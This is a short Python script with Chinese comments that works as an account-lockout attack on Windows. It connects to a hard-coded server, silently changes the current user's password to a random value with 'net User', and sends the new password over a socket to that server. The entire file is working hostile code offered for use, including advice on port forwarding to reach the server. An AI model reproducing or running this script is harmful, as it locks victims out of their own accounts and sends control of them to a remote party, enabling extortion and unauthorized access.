#!/usr/bin/env python
# encoding: utf-8
# @Time    : 2019/1/28 5:18 AM

__author__ = 'Miracle'

import socket
import getpass
import subprocess
import random
import string

# 我们使用socket与服务器进行交互，因为这个比较简单，否则server端还要写个接口
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 连接server端IP地址、端口，如果你是在家里的电脑，那你得去路由器上做个端口映射
client.connect(('192.168.31.246', 8080))

# 获取计算机用户名
user = getpass.getuser()

# 生成a-zA-Z0-9的随机密码
letters = string.ascii_letters + string.digits
pwd = ''.join([random.choice(letters) for _ in range(8)])

# 控制windows cmd，并修改密码
subprocess.Popen(['net', 'User', user, pwd])

# 通过socket 将密码发送给server端
client.send(pwd.encode('utf-8'))

msg = client.recv(1024)
client.close()
print(pwd)
